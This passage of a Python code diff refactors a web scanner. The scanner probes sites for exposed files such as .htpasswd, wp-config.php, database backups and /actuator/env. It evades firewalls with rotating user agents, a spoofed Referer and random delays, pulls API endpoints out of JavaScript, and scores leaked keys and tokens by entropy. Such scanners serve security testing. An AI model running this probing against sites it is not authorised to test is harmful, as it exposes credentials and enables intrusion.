-    "/config.js", "/config.json", "/app.config.js",
-    "/webpack.config.js", "/package.json", "/package-lock.json",
-    "/robots.txt", "/sitemap.xml",
-    "/backup.zip", "/backup.sql", "/db.sql", "/database.sql",
-    "/wp-config.php", "/phpinfo.php", "/info.php",
-    "/admin/", "/administrator/",
-    "/swagger.json", "/swagger.yaml", "/openapi.json", "/api-docs",
-    "/graphql", "/graphiql",
-    "/.htaccess", "/.htpasswd",
-    "/api/v1/", "/api/v2/", "/api/v3/",
-    "/actuator", "/actuator/health", "/actuator/env",
-    "/metrics", "/health", "/status", "/debug", "/console",
-    "/server-status",
-]
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  PRINT HELPERS
-# ═════════════════════════════════════════════════════════════════════════════
+# ─────────────────────────────────────────────────────────────────────────────
+#  HELPERS
+# ─────────────────────────────────────────────────────────────────────────────
 
 print_lock = threading.Lock()
 
-def cprint(msg, color="", prefix=""):
+def W():
+    try:
+        return max(60, min(shutil.get_terminal_size(fallback=(100,40)).columns, 120))
+    except Exception:
+        return 100
+
+def cp(msg, color=WHITE, pre=""):
     with print_lock:
-        w = term_width() - len(prefix) - 2
-        if len(msg) > w:
-            msg = msg[:w-3] + "..."
-        print(f"{color}{prefix}{msg}{RESET}")
+        w = W() - len(pre) - 2
+        if len(str(msg)) > w:
+            msg = str(msg)[:w-3] + "..."
+        print(f"{color}{pre}{msg}{RESET}")
 
-def info(msg):    cprint(msg, FG_LOW,      "[*] ")
-def success(msg): cprint(msg, FG_SUCCESS,  "[+] ")
-def warn(msg):    cprint(msg, FG_WAF,      "[!] ")
-def error(msg):   cprint(msg, FG_CRITICAL, "[-] ")
+def info(m):    cp(m, BLUE,   "[*] ")
+def ok(m):      cp(m, GREEN,  "[+] ")
+def warn(m):    cp(m, YELLOW, "[!] ")
+def err(m):     cp(m, RED,    "[-] ")
 
-def get_platform_info():
+def sep(c="─"):
+    with print_lock:
+        print(f"{DIM}{c * W()}{RESET}")
+
+def hdr(title, color=WHITE):
+    w = W()
+    p = max(0, (w - len(title) - 4) // 2)
+    with print_lock:
+        print(f"\n{color}{'═'*w}")
+        print(f"{'═'*p}  {title}  {'═'*max(0, w-p-len(title)-4)}")
+        print(f"{'═'*w}{RESET}")
+
+def normalize(url):
+    url = url.strip()
+    if url.startswith("//"):
+        return "https:" + url
+    if not url.startswith(("http://", "https://")):
+        return "https://" + url
+    return url.rstrip("/")
+
+def domain_of(url):
+    return urlparse(url).netloc
+
+def get_platform():
     return f"{platform.system()} {platform.release()} / Python {platform.python_version()}"
 
-def random_delay(waf_mode=False):
-    time.sleep(random.uniform(1.5, 4.0) if waf_mode else random.uniform(0.1, 0.5))
+# ─────────────────────────────────────────────────────────────────────────────
+#  USER AGENTS
+# ─────────────────────────────────────────────────────────────────────────────
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  HTTP HELPERS
-# ═════════════════════════════════════════════════════════════════════════════
+UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+]
 
-def build_session(waf_aware=False):
-    session = requests.Session()
-    headers = {
-        "User-Agent": random.choice(USER_AGENTS),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+def make_session(waf=False):
+    s = requests.Session()
+    s.headers.update({
+        "User-Agent": random.choice(UAS),
+        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9",
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
-        "Cache-Control": "max-age=0",
-    }
-    if waf_aware:
-        headers["Referer"] = "https://www.google.com/"
-        headers["DNT"] = "1"
-    session.headers.update(headers)
-    return session
+    })
+    if waf:
+        s.headers["Referer"] = "https://www.google.com/"
+    return s
 
-def fetch_url(url, session, timeout=15, waf_aware=False, retries=3):
+def fetch(url, session, timeout=12, retries=2, allow_redirects=True):
     for attempt in range(retries):
         try:
-            if waf_aware and attempt > 0:
-                random_delay(waf_mode=True)
-                session = build_session(waf_aware=True)
-            resp = session.get(url, timeout=timeout, allow_redirects=True, verify=False)
-            session.headers["User-Agent"] = random.choice(USER_AGENTS)
-            return resp
+            r = session.get(url, timeout=timeout, verify=False,
+                           allow_redirects=allow_redirects)
+            session.headers["User-Agent"] = random.choice(UAS)
+            return r
         except requests.exceptions.SSLError:
             try:
-                return session.get(url, timeout=timeout, allow_redirects=True, verify=False)
+                return session.get(url, timeout=timeout, verify=False,
+                                  allow_redirects=allow_redirects)
             except Exception:
                 pass
-        except requests.exceptions.ConnectionError:
-            if attempt < retries - 1:
-                time.sleep(2 ** attempt)
-        except requests.exceptions.Timeout:
+        except Exception:
             if attempt < retries - 1:
                 time.sleep(1)
-        except Exception:
-            pass
     return None
 
-def normalize_url(url):
-    url = url.strip()
-    url = re.sub(r'^\[.*?\]\(', '', url).rstrip(')')
-    if url.startswith("//"):
-        url = "https:" + url
-    elif url.startswith("ftp://"):
-        url = "https://" + url[6:]
-    elif not url.startswith(("http://", "https://")):
-        url = "https://" + url
-    return url.rstrip("/")
-
-def try_http_fallback(url, session, timeout=10):
-    resp = fetch_url(url, session, timeout=timeout)
-    if resp is not None:
-        return url, resp
+def fetch_with_fallback(url, session, timeout=12):
+    """Try HTTPS first, fall back to HTTP if it fails."""
+    r = fetch(url, session, timeout=timeout)
+    if r is not None:
+        return url, r
     if url.startswith("https://"):
-        http_url = "http://" + url[8:]
-        info(f"HTTPS failed → retrying HTTP: {http_url}")
-        resp = fetch_url(http_url, session, timeout=timeout)
-        if resp is not None:
-            success(f"HTTP fallback worked: {http_url}")
-            return http_url, resp
+        http = "http://" + url[8:]
+        r = fetch(http, session, timeout=timeout)
+        if r is not None:
+            return http, r
     return url, None
 
-def get_domain(url):
-    return urlparse(url).netloc
+# ─────────────────────────────────────────────────────────────────────────────
+#  WHAT MAKES A FILE A LIBRARY vs APP CODE
+#  We don't analyse library files for app-specific vulnerabilities.
+#  A developer cannot fix jQuery's internals.
+# ─────────────────────────────────────────────────────────────────────────────
 
-def detect_waf(response):
-    detected = []
-    response_text = response.text.lower() if response.text else ""
-    headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
-    combined = response_text + " " + str(headers_lower)
-    for waf_name, sigs in WAF_SIGNATURES.items():
+LIBRARY_NAMES = {
+    "jquery", "bootstrap", "aos", "swiper", "toastr", "lodash", "underscore",
+    "moment", "axios", "react", "vue", "angular", "d3", "chart", "leaflet",
+    "three", "gsap", "slick", "select2", "datatables", "fullcalendar",
+    "highlight", "prism", "codemirror", "tinymce", "ckeditor", "socket.io",
+    "popper", "modernizr", "normalize", "lazysizes", "svg-loader",
+    "magnific-popup", "nice-select", "polyfill", "core-js", "regenerator",
+    "babel", "webpack", "fontawesome", "materialize", "bulma", "sweetalert",
+    "animate", "waypoints", "isotope", "masonry", "lightbox", "fancybox",
+    "owl-carousel", "splide", "glide", "plugin", "vendor", "vendors",
+}
+
+LIBRARY_URL_HINTS = [
+    "node_modules", "node_vendors", "/vendor/", "/vendors/",
+    "/lib/", "/libs/", "/dist/", "/cdn/",
+]
+
+def is_library(url, content_head=""):
+    fname = url.split("/")[-1].lower()
+    # strip hash suffixes like -3bfe1920e4fc94cca843
+    clean = re.sub(r"[-_~][a-f0-9]{6,}", "", fname)
+    clean = re.sub(r"[-_.](?:v?\d[\d.]*|min|bundle|esm|cjs|umd)", "", clean)
+    clean = clean.replace(".js","").replace(".chunk","").strip("-_~.")
+
+    for lib in LIBRARY_NAMES:
+        if lib in clean or clean in lib:
+            return True, f"known library: {lib}"
+
+    url_l = url.lower()
+    for hint in LIBRARY_URL_HINTS:
+        if hint in url_l:
+            return True, f"vendor path: {hint}"
+
+    # content-based: ACE editor, webpack vendor bundle
+    if content_head:
+        sigs = [
+            r"Ace \(Ajax\.org Cloud9 Editor\)",
+            r"webpackJsonp.*node_vendors",
+            r"This file is part of (jQuery|Bootstrap|Vue)",
+            r"@license.*MIT.*(jquery|bootstrap|react|vue|angular)",
+            r"Leaflet - a JS library for",
+            r"Copyright.*Bootstrap",
+        ]
         for sig in sigs:
-            if sig.lower() in combined:
-                detected.append(waf_name)
-                break
-    if response.status_code in [403, 406, 429, 503] and not detected:
-        detected.append("Unknown WAF/Firewall")
-    return list(set(detected))
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  STATUS CODE PROBE
-#  New feature: check if subdomains/targets are alive before scanning
-# ═════════════════════════════════════════════════════════════════════════════
-
-def probe_status(url, session, timeout=8):
-    """
-    Quick status check on a URL.
-    Returns (url, status_code, redirect_url, response_time_ms).
-    """
-    start = time.time()
-    try:
-        resp = session.get(url, timeout=timeout, allow_redirects=False, verify=False)
-        elapsed = int((time.time() - start) * 1000)
-        redirect = resp.headers.get("Location", "") if resp.status_code in [301,302,303,307,308] else ""
-        return url, resp.status_code, redirect, elapsed
-    except Exception:
-        elapsed = int((time.time() - start) * 1000)
-        return url, 0, "", elapsed
-
-def print_status_result(url, status, redirect, ms):
-    """print one status result with appropriate coloring"""
-    color = STATUS_COLORS.get(status, FG_DIM)
-    icon  = STATUS_ICONS.get(status, "?") if not isinstance(STATUS_ICONS, defaultdict) else STATUS_ICONS[status]
-    ms_color = FG_SUCCESS if ms < 500 else FG_MEDIUM if ms < 2000 else FG_CRITICAL
-
-    # truncate URL to fit terminal
-    w      = term_width()
-    url_w  = w - 35
-    disp   = url[:url_w] + "..." if len(url) > url_w else url
-
-    line = (f"  {color}{icon} [{status:3d}]{RESET}  "
-            f"{FG_URL}{disp:<{url_w}}{RESET}  "
-            f"{ms_color}{ms:4d}ms{RESET}")
-
-    if redirect:
-        redir_w = w - 12
-        redir   = redirect[:redir_w] + "..." if len(redirect) > redir_w else redirect
-        line += f"  {FG_DIM}→ {redir}{RESET}"
-
-    with print_lock:
-        print(line)
-
-def run_status_check(targets, session, threads=5):
-    """probe all targets for status codes in parallel"""
-    section_header("STATUS CHECK", FG_SECTION)
-
-    # print header row
-    w = term_width()
-    print(f"  {FG_DIM}{'STATUS':<12}{'URL':<{w-35}}{'TIME':>6}{RESET}")
-    print(f"  {FG_DIM}{'─'*12}{'─'*(w-35)}{'─'*6}{RESET}")
-
-    alive  = []
-    dead   = []
-
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {executor.submit(probe_status, t, session): t for t in targets}
-        for future in as_completed(futures):
-            url, status, redirect, ms = future.result()
-            print_status_result(url, status, redirect, ms)
-            if status in [200, 201, 204, 301, 302, 403]:
-                alive.append(url)
-            else:
-                dead.append(url)
-
-    print()
-    success(f"Alive: {len(alive)}  |  Dead/Unreachable: {len(dead)}")
-    return alive, dead
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  TECHNOLOGY FINGERPRINTING
-# ═════════════════════════════════════════════════════════════════════════════
-
-def fingerprint_technologies(content, url=""):
-    """
-    Scan JS/HTML content for known tech stack patterns.
-    Returns list of detected technologies and any version warnings.
-    """
-    detected = {}
-    for tech, patterns in TECH_FINGERPRINTS.items():
-        for pat in patterns:
-            if re.search(pat, content, re.IGNORECASE):
-                detected[tech] = {"url": url}
-                # try to extract version
-                if tech in VERSION_PATTERNS:
-                    vmatch = re.search(VERSION_PATTERNS[tech], content, re.IGNORECASE)
-                    if vmatch:
-                        detected[tech]["version"] = vmatch.group(1)
-                break
-    return detected
-
-def check_tech_risks(detected_techs):
-    """
-    Cross-reference detected technologies against known risky versions.
-    Returns list of risk warnings.
-    """
-    risks = []
-    for tech, info in detected_techs.items():
-        version = info.get("version")
-        if not version or tech not in RISKY_VERSIONS:
-            continue
-        # simple version comparison (covers most cases)
-        for threshold, note in RISKY_VERSIONS[tech].items():
-            try:
-                op  = threshold[:1]
-                ver = threshold[1:]
-                v_parts = [int(x) for x in version.split(".")]
-                t_parts = [int(x) for x in ver.split(".")]
-                # pad to same length
-                while len(v_parts) < len(t_parts): v_parts.append(0)
-                while len(t_parts) < len(v_parts): t_parts.append(0)
-                if op == "<" and v_parts < t_parts:
-                    risks.append({
-                        "tech":    tech,
-                        "version": version,
-                        "note":    note,
-                        "severity":"medium"
-                    })
-            except Exception:
-                continue
-    return risks
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  FALSE POSITIVE REDUCTION ENGINE
-#
-#  One of the biggest problems with pattern-matching security tools is noise.
-#  A raw regex that matches "password" will fire on:
-#    - password = "enter your password here"   ← placeholder, NOT a real secret
-#    - password = "changeme"                   ← example value, NOT a real secret
-#    - password = myVariable                   ← no value, NOT a finding
-#    - password = "x7kP#mQ2!vL9nR4"            ← THIS is a real finding
-#
-#  This engine scores each raw match and decides:
-#    CONFIRMED  — high confidence, show it prominently
-#    LIKELY     — probably real, show with a note
-#    POSSIBLE   — low confidence, show only in verbose mode
-#    FILTERED   — almost certainly a false positive, drop it silently
-#
-#  This way users see fewer irrelevant results and can trust what they see.
-# ═════════════════════════════════════════════════════════════════════════════
-
-# placeholder values that almost always indicate a false positive
-# developers use these as example/template values in their code
-FP_PLACEHOLDER_VALUES = {
-    # generic placeholders
-    "your_api_key_here", "insert_key_here", "api_key_here",
-    "your-api-key", "api-key-here", "enter_api_key",
-    "put_your_key_here", "replace_with_your_key",
-    # password placeholders
-    "password", "your_password", "enter_password",
-    "changeme", "change_me", "change-me",
-    "yourpassword", "mypassword", "testpassword",
-    "password123", "123456", "qwerty", "admin",
-    "pass", "passwd", "secret", "test", "example",
-    # token placeholders
-    "your_token_here", "token_here", "insert_token",
-    "your-token", "mytoken", "testtoken", "sample_token",
-    # null/undefined
-    "null", "undefined", "none", "false", "true",
-    "n/a", "na", "tbd", "todo", "fixme",
-    # empty / short
-    "", " ", "x", "xx", "xxx", "test123",
-    # documentation examples
-    "sk-xxxxxxxxxxxxxxxxxxxx", "akia_xxxxxxxxxxxxxxxxxxxx",
-    "your_secret_key", "your_access_key",
-    "1234567890abcdef", "abcdefghijklmnop",
-}
-
-# regex patterns that almost always indicate a false positive context
-FP_CONTEXT_PATTERNS = [
-    # comment lines — value is in a comment, not real code
-    r'^\s*[/*#]+.*(?:key|token|password|secret)',
-    # documentation strings
-    r'(?:example|sample|placeholder|dummy|fake|mock|test|demo)\s*[=:]',
-    # console.log — developer was just printing it
-    r'console\.\w+\s*\(',
-    # HTML/template variables like {{ API_KEY }} or <%= key %>
-    r'\{\{.*\}\}|\<%.*%\>',
-    # variable assigned to another variable (no literal value)
-    r'=\s*(?:process\.env\.|config\.|settings\.|env\.)',
-    # import/require statement — not a hardcoded value
-    r'(?:import|require)\s*[\(\{]',
-]
-
-# patterns that INCREASE confidence a finding is real
-FP_REAL_INDICATORS = [
-    # high-entropy strings — real keys look random
-    # base64-like long strings
-    r'[A-Za-z0-9+/]{40,}={0,2}',
-    # hex strings typical of real tokens
-    r'[0-9a-f]{32,}',
-    # AWS key format
-    r'AKIA[0-9A-Z]{16}',
-    # starts with known real prefixes
-    r'sk_live_', r'pk_live_', r'SG\.', r'ghp_', r'gho_', r'github_pat_',
-    # PEM block — always real
-    r'-----BEGIN',
-]
-
-# known test/example domains — findings in these files are likely fake
-FP_TEST_DOMAINS = {
-    "example.com", "test.com", "localhost", "127.0.0.1",
-    "placeholder.com", "yourdomain.com", "domain.com",
-    "sample.com", "demo.com", "fake.com",
-}
-
-
-def string_entropy(s):
-    """
-    Calculate Shannon entropy of a string.
-    Real secrets have high entropy (look random).
-    Placeholder values have low entropy (repetitive/dictionary words).
-    Returns a float: higher = more random = more likely real.
-    """
-    if not s or len(s) < 4:
-        return 0.0
-    import math
-    freq = {}
-    for c in s:
-        freq[c] = freq.get(c, 0) + 1
-    length  = len(s)
-    entropy = -sum((count/length) * math.log2(count/length) for count in freq.values())
-    return round(entropy, 2)
-
-
-def assess_finding_confidence(match_text, context_line, category, severity, source_domain=""):
-    """
-    Score a finding for confidence — is it real or a false positive?
-
-    Returns a dict:
-      confidence: "confirmed" | "likely" | "possible" | "filtered"
-      confidence_score: 0-100
-      fp_reason: why we think it might be FP (if applicable)
-      fn_note: note about potential false negatives (if applicable)
-      adjusted_severity: may downgrade severity for low-confidence findings
-    """
-    result = {
-        "confidence":        "possible",
-        "confidence_score":  50,
-        "fp_reason":         "",
-        "fn_note":           "",
-        "adjusted_severity": severity,
-    }
-
-    score = 50  # start neutral
-
-    # ── EARLY DEFINITIVE FILTERS — checked before anything else ─────────
-
-    # filter: syntax tokens from code editors (ACE, CodeMirror, etc.)
-    # token:"entity.other.attribute-name.xml" is a grammar definition, not a credential
-    if is_syntax_token(match_text, context_line):
-        result["confidence"] = "filtered"
-        result["fp_reason"]  = "Syntax grammar token — code editor definition, not a credential"
-        return result
-
-    # filter: hex/unicode data tables (character code tables used in editors/fonts)
-    # "0028005B007B0F3A..." is sequential unicode codepoints, not a token
-    hex_val = re.search(r'["\'\']([0-9A-Fa-f]{20,})["\'\']', match_text)
-    if hex_val and looks_like_data_table(hex_val.group(1)):
-        result["confidence"] = "filtered"
-        result["fp_reason"]  = "Sequential hex values — unicode character table, not a token"
-        return result
-
-    # filter: webpack module definitions — the context line starting with
-    # webpackJsonp means everything on that line is minified bundle boilerplate
-    if 'webpackJsonp' in context_line and 'AKIA' not in match_text and 'sk_live_' not in match_text:
-        if category not in ('AWS Credentials', 'Cloud & Infrastructure'):
-            score -= 35
-            result["fp_reason"] = "Found inside webpack bundle boilerplate — likely not application code"
-
-    # ── extract the actual value from the match ──────────────────────────
-    # try to pull out just the value part (after = or :)
-    value_match = re.search(r'[=:]\s*["\']?([^"\';\s,\]{)]{4,})["\']?', match_text)
-    value       = value_match.group(1).strip() if value_match else match_text.strip()
-    value_lower = value.lower()
-
-    # ── false positive checks ────────────────────────────────────────────
-
-    # check 1: is the value a known placeholder?
-    if value_lower in FP_PLACEHOLDER_VALUES or len(value) < 6:
-        score -= 40
-        result["fp_reason"] = f"Value '{value[:30]}' looks like a placeholder or example"
-
-    # check 2: is the value suspiciously short or all the same char?
-    if len(value) < 8:
-        score -= 20
-        result["fp_reason"] = "Value is very short — likely not a real secret"
-
-    if len(set(value)) < 3:
-        score -= 30
-        result["fp_reason"] = "Value has very low character variety — likely placeholder"
-
-    # check 3: does the context line suggest it's a comment or template?
-    for ctx_pat in FP_CONTEXT_PATTERNS:
-        if re.search(ctx_pat, context_line, re.IGNORECASE):
-            score -= 25
-            result["fp_reason"] = "Found in comment, template, or environment variable reference"
-            break
-
-    # check 4: is it from a known test domain?
-    if source_domain.lower().replace("www.", "") in FP_TEST_DOMAINS:
-        score -= 20
-        result["fp_reason"] = "Source domain looks like a test/example domain"
-
-    # check 5: does it look like a variable name rather than a value?
-    if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', value) and len(value) < 30:
-        score -= 20
-        result["fp_reason"] = "Match looks like a variable name, not a hardcoded value"
-
-    # check 6: process.env references are never hardcoded secrets
-    if "process.env." in match_text or "os.environ" in match_text:
-        score -= 50
-        result["fp_reason"] = "Value comes from environment variable — not hardcoded"
-
-    # ── real/confirmed indicators ─────────────────────────────────────────
-
-    # boost 1: high entropy = looks like a real secret
-    ent = string_entropy(value)
-    if ent >= 4.5:
-        score += 30
-    elif ent >= 3.5:
-        score += 15
-    elif ent < 2.0:
-        score -= 20
-
-    # boost 2: matches a known real-credential format
-    for real_pat in FP_REAL_INDICATORS:
-        if re.search(real_pat, match_text):
-            score += 35
-            break
-
-    # boost 3: category-specific boosts for highest-confidence patterns
-    if category == "AWS Credentials" and re.search(r'AKIA[0-9A-Z]{16}', match_text):
-        score = 95   # AWS access key ID format is unique — almost never FP
-        result["fp_reason"] = ""
-
-    if category == "Cloud & Infrastructure":
-        if re.search(r'sk_live_[A-Za-z0-9]{24,}', match_text):
-            score = 95  # Stripe live key format is unique
-        if re.search(r'SG\.[A-Za-z0-9_\-\.]{40,}', match_text):
-            score = 90  # SendGrid key format
-
-    if re.search(r'-----BEGIN (RSA |EC )?PRIVATE KEY-----', match_text):
-        score = 99  # PEM block is never a false positive
-
-    # ── clamp score to 0-100 ─────────────────────────────────────────────
-    score = max(0, min(100, score))
-    result["confidence_score"] = score
-
-    # ── assign confidence label ───────────────────────────────────────────
-    if score >= 75:
-        result["confidence"]        = "confirmed"
-        result["adjusted_severity"] = severity  # keep original
-    elif score >= 50:
-        result["confidence"]        = "likely"
-        result["adjusted_severity"] = severity
-    elif score >= 25:
-        result["confidence"]        = "possible"
-        # downgrade severity one level for uncertain findings
-        downgrade = {"critical":"high","high":"medium","medium":"low","low":"info","info":"info"}
-        result["adjusted_severity"] = downgrade.get(severity, severity)
-    else:
-        result["confidence"] = "filtered"
-        result["fp_reason"]  = result["fp_reason"] or "Low confidence — likely false positive"
-
-    return result
-
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  FALSE NEGATIVE REDUCTION ENGINE
-#
-#  False negatives = real secrets we MISSED because our regex was too strict.
-#  This engine adds a second pass with broader, fuzzier patterns to catch
-#  things the main patterns might have missed.
-#
-#  These looser patterns would create too much noise as primary patterns,
-#  but run AFTER the main pass they only fire on things not already found.
-# ═════════════════════════════════════════════════════════════════════════════
-
-# broader catch-all patterns for the second pass
-# these are intentionally looser than the main patterns
-# ─── Known third-party library filenames ────────────────────────────────────
-# If a JS file matches any of these, we skip broad-pass analysis entirely.
-# These are vendor libraries — developers didn't write them and can't fix them.
-# Reporting findings from these files is pure noise.
-KNOWN_LIBRARY_FILENAMES = {
-    "ace", "ace-editor", "ace-min", "ace.min",
-    "lodash", "lodash.min", "underscore", "underscore.min",
-    "jquery", "jquery.min", "jquery-ui", "jquery-ui.min",
-    "bootstrap", "bootstrap.min", "bootstrap.bundle",
-    "moment", "moment.min", "moment-timezone",
-    "react", "react.min", "react-dom", "react.development",
-    "vue", "vue.min", "vue.runtime",
-    "angular", "angular.min",
-    "d3", "d3.min", "d3.v5", "d3.v6", "d3.v7",
-    "three", "three.min",
-    "chart", "chart.min", "chartjs",
-    "leaflet", "leaflet.min",
-    "highlight", "highlight.min", "hljs",
-    "prism", "prism.min",
-    "codemirror",
-    "tinymce", "tinymce.min",
-    "ckeditor",
-    "socket.io", "socket.io.min",
-    "axios", "axios.min",
-    "popper", "popper.min",
-    "font-awesome",
-    "materialize",
-    "bulma",
-    "sweetalert", "sweetalert2",
-    "select2",
-    "datatables",
-    "fullcalendar",
-    "gsap",
-    "swiper",
-    "slick",
-    "aos",
-    "modernizr",
-    "normalize",
-    "polyfill",
-    "core-js",
-    "regenerator",
-    "babel",
-    "webpack",
-    "node_modules",
-    "node_vendors",
-    "vendors",
-    "vendor",
-    "chunk",          # webpack chunk files often contain third-party code
-}
-
-# Known library content signatures — if file CONTENT matches these,
-# it's a third-party library regardless of filename
-KNOWN_LIBRARY_CONTENT_SIGS = [
-    r'webpackJsonp.*node_vendors',
-    r'node_vendors~',                       # webpack vendor chunk naming pattern          # webpack vendor bundle
-    r'This file is part of (jQuery|React|Angular|Vue)',
-    r'@license.*MIT.*jquery',
-    r'Ace \(Ajax.org Cloud9 Editor\)',       # ACE editor
-    r'CodeMirror, copyright',
-    r'Leaflet - a JS library for',
-    r'D3\.js - Data-Driven Documents',
-    r'Lodash.*MIT License',
-    r'moment\.js.*copyright',
-    r'Copyright.*Bootstrap',
-    r'THREE\.REVISION',                     # three.js
-    r'Chart\.js.*Copyright',
-    r'!function\(e\)\{if\("object"==typeof exports&&"undefined"!=typeof module\)',  # UMD bundle pattern
-]
-
-def is_library_file(url, content_sample):
-    """
-    Determine if a JS file is a third-party library.
-    Checks both the filename and the first 500 chars of content.
-    Returns (bool, reason).
-    """
-    # check filename against known library names
-    filename = url.split('/')[-1].lower()
-    # strip version numbers and hashes from filename
-    # e.g. "jquery-3.6.0.min.js" -> "jquery"
-    # strip version numbers, hashes, chunk suffixes from filename
-    # handles: jquery-3.6.0.min.js, admin-3bfe1920e4fc94cca843.chunk.js, etc.
-    clean_name = re.sub(r'[-_~.](?:v?\d[\d\.]*|min|bundle|esm|cjs|umd)', '', filename)
-    clean_name = re.sub(r'[-_~][a-f0-9]{6,}', '', clean_name)  # remove hex hashes
-    clean_name = re.sub(r'\d{6,}', '', clean_name)              # remove long digit sequences
-    clean_name = clean_name.replace('.js', '').replace('.chunk', '').strip('-_~.')
-
-    for lib in KNOWN_LIBRARY_FILENAMES:
-        if lib in clean_name or clean_name in lib:
-            return True, f"Filename matches known library: {lib}"
-
-    # check URL path components
-    url_lower = url.lower()
-    for lib in ['node_vendors', 'node_modules', '/vendor/', '/vendors/', '/lib/', '/libs/', 'node_vendors~']:
-        if lib in url_lower:
-            return True, f"URL path indicates vendor bundle: {lib}"
-
-    # check content signatures (first 1000 chars)
-    for sig in KNOWN_LIBRARY_CONTENT_SIGS:
-        if re.search(sig, content_sample[:1000], re.IGNORECASE):
-            return True, f"Content matches library signature"
+            if re.search(sig, content_head[:2000], re.IGNORECASE):
+                return True, "library content signature"
 
     return False, ""
 
+# ─────────────────────────────────────────────────────────────────────────────
+#  CORE ANALYSIS — THE FOUR THINGS WE LOOK FOR
+# ─────────────────────────────────────────────────────────────────────────────
 
-# ─── Hex/unicode pattern filters ─────────────────────────────────────────────
-# These patterns help us distinguish real tokens from data tables
-
-def looks_like_data_table(hex_string):
+def extract_endpoints(content, base_url):
     """
-    Unicode/hex character tables look like tokens but aren't.
-    Real tokens: random alphanumeric, uniform distribution
-    Data tables: sequential unicode codepoints like 0028 0029 002A...
+    Extract URL endpoints and their parameters from JS content.
+    Only returns endpoints that look like real API/app routes —
+    not every string that contains a slash.
     """
-    if not hex_string:
-        return False
+    found = {}   # endpoint -> {params, method, line, context}
+    seen  = set()
+    lines = content.split("\n")
+    base  = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
 
-    # check for sequential unicode codepoints (e.g. 0028005B007B...)
-    # real tokens don't have this pattern
-    chunks = [hex_string[i:i+4] for i in range(0, min(len(hex_string), 40), 4)]
-    if len(chunks) >= 4:
-        try:
-            vals = [int(c, 16) for c in chunks if len(c) == 4]
-            if len(vals) >= 4:
-                # if values increase sequentially (like unicode tables), it's data
-                diffs = [vals[i+1] - vals[i] for i in range(len(vals)-1)]
-                if all(0 < d < 200 for d in diffs[:4]):
-                    return True
-        except ValueError:
-            pass
+    def add(ep, params, method, line_num, ctx):
+        ep = ep.strip().rstrip("/")
+        if not ep or len(ep) < 3 or len(ep) > 150:
+            return
+        # must look like a path — starts with / or http
+        if not (ep.startswith("/") or ep.startswith("http")):
+            return
+        # skip pure file extensions
+        if re.match(r'^/[^/]+\.(jpg|png|gif|svg|css|woff|ttf|ico|mp4|mp3)$', ep, re.I):
+            return
+        key = ep.lower()
+        if key in seen:
+            # merge params
+            if ep in found:
+                found[ep]["params"] = list(set(found[ep]["params"] + params))
+            return
+        seen.add(key)
+        found[ep] = {
+            "params":  list(set(params)),
+            "method":  method,
+            "line":    line_num,
+            "context": ctx[:100],
+        }
 
-    # check for repeating 2-char patterns typical of unicode escapes
-    if re.match(r'^([0-9A-F]{4}){3,}$', hex_string.upper()):
-        return True
+    def line_of(pos):
+        return content[:pos].count("\n") + 1
 
-    return False
+    def ctx_at(pos):
+        ln = line_of(pos)
+        return lines[ln-1].strip()[:120] if ln <= len(lines) else ""
+
+    # ── Pattern 1: fetch() calls ──────────────────────────────────────────
+    for m in re.finditer(
+        r'fetch\s*\(\s*["\']([^"\']{3,100})["\']',
+        content, re.IGNORECASE
+    ):
+        ep = m.group(1)
+        # look for body params nearby
+        nearby = content[m.start():min(m.start()+300, len(content))]
+        bm = re.search(r'body\s*:\s*JSON\.stringify\s*\(\s*\{([^}]{0,200})\}', nearby)
+        params = list(set(re.findall(r'(\w+)\s*:', bm.group(1)))) if bm else []
+        method = "POST" if bm else "GET"
+        add(ep, params, method, line_of(m.start()), ctx_at(m.start()))
+
+    # ── Pattern 2: fetch() with template literal ──────────────────────────
+    for m in re.finditer(r'fetch\s*\(\s*`([^`]{3,100})`', content, re.IGNORECASE):
+        raw = m.group(1)
+        params = re.findall(r'\$\{(\w+)\}', raw)
+        ep = re.sub(r'\$\{[^}]+\}', '*', raw)
+        add(ep, params, "GET", line_of(m.start()), ctx_at(m.start()))
+
+    # ── Pattern 3: axios calls ────────────────────────────────────────────
+    for m in re.finditer(
+        r'axios\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']{3,100})["\']',
+        content, re.IGNORECASE
+    ):
+        method = m.group(1).upper()
+        ep     = m.group(2)
+        nearby = content[m.start():min(m.start()+250, len(content))]
+        bm     = re.search(r'\{([^}]{0,200})\}', nearby)
+        params = list(set(re.findall(r'(\w+)\s*:', bm.group(1)))) if bm else []
+        add(ep, params, method, line_of(m.start()), ctx_at(m.start()))
+
+    # ── Pattern 4: XMLHttpRequest ─────────────────────────────────────────
+    for m in re.finditer(
+        r'\.open\s*\(\s*["\']([A-Z]+)["\'],\s*["\']([^"\']{3,100})["\']',
+        content, re.IGNORECASE
+    ):
+        add(m.group(2), [], m.group(1).upper(), line_of(m.start()), ctx_at(m.start()))
+
+    # ── Pattern 5: URL with query string ─────────────────────────────────
+    for m in re.finditer(
+        r'["\'](\/?[a-zA-Z0-9_\-/]+\?[a-zA-Z0-9_=&%+\-]{3,100})["\']',
+        content, re.IGNORECASE
+    ):
+        full = m.group(1)
+        if "?" in full:
+            path, qs = full.split("?", 1)
